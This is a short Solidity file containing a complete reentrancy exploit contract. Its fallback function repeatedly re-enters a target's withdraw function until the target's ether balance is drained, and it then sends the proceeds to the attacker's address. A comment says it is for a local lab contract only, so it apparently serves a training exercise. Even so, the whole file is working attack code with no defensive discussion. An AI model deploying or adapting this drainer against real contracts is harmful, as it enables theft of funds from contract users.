pragma solidity 0.4.24;

// Run only against the local lab contract Dangerous.
contract LabTarget {
    function depositMoney() public payable;
    function withdraw(uint amount) public;
}

contract ReentrancyAttack {
    LabTarget public target;
    address public owner;
    uint public chunk;

    constructor(address targetAddress) public {
        target = LabTarget(targetAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner && msg.value > 0);
        chunk = msg.value;
        target.depositMoney.value(chunk)();
        target.withdraw(chunk);
        require(owner.call.value(address(this).balance)());
    }

    function() external payable {
        require(msg.sender == address(target));
        uint remaining = address(target).balance;
        if (remaining > 0) {
            uint amount = remaining < chunk ? remaining : chunk;
            target.withdraw(amount);
        }
    }
}
